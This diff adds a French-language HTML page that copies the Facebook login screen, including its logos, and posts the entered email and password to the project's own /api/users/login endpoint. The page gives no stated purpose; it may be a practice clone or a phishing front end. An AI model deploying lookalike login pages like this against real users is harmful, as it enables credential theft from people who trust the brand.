@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Facebook Connexion</title>
+        <link rel="stylesheet" href="style.css">
+    </head>
+
+    <body>
+        <div class="body">
+
+            <div class="langue">
+                <p>Français (France)</p>
+            </div>
+
+            <div class="logo">
+                <img src="image/facebook-logo.png">
+            </div>
+
+            <div class="formulaire">
+                <form action="/api/users/login" method="post"> 
+                    <input type="text" name="email" placeholder="Numéro mobile ou e-mail" required><br>
+                    <input type="password" name="password" placeholder="Mot de passe" required><br>
+                    <button type="submit">Se connecter</button><br>
+                    <a href="signup.html">Mot de passe oublié ?</a>
+                </form>
+            </div>
+
+            <div class="footer">
+                <button type="submit">Se connecter</button><br>
+                <img src="image/meta-logo.webp">
+            </div>
+        </div>
+
+        <script src="scriptConnexion.js"></script>
+    </body>
+</html>
